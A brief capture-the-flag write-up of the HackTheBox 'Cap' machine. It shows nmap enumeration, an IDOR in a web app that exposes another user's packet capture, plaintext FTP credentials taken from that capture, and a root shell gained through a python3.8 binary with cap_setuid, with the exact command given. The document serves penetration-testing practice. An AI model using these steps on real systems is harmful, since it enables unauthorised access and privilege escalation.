# Cap — HackTheBox (Easy)

## Machine Info
- **Platform:** HackTheBox
- **Difficulty:** Easy
- **OS:** Linux

- ## Enumeration
Ran nmap scan  'nmap -sV <target> to find service+version on open ports
3 Open Ports found --> **21 , 22 , 80**
Open the Web app running on port 80
--> http://10.129.39.146/data/1  with **user nathan**

Change the URL path to  **'data/0'** to get another file's access

## Foothold
- Downloaded the PCAP file
- Analyzed it in Wireshark/tshark
- Found FTP credentials in plaintext
- SSH'd into the machine as user nathan 

 ## Privilege Escalation
- Ran: `getcap -r / 2>/dev/null`
- Found: `/usr/bin/python3.8 = cap_setuid+eip`
- Exploited with:
  `/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
- Got root shell

## Flags
- User: ✅ --> nathan's home directory --> user.txt
- Root: ✅ --> /root/root.txt

## Summary
- How Linux Capabilities work
- How to find and abuse cap_setuid for privilege escalation
- Cap is a Linux machine that involves exploiting a web application 
exposing network capture files, leading to credential discovery. 
Privilege escalation is achieved by abusing Linux capabilities on Python3.8.
- Importance of checking PCAP files for plaintext credentials

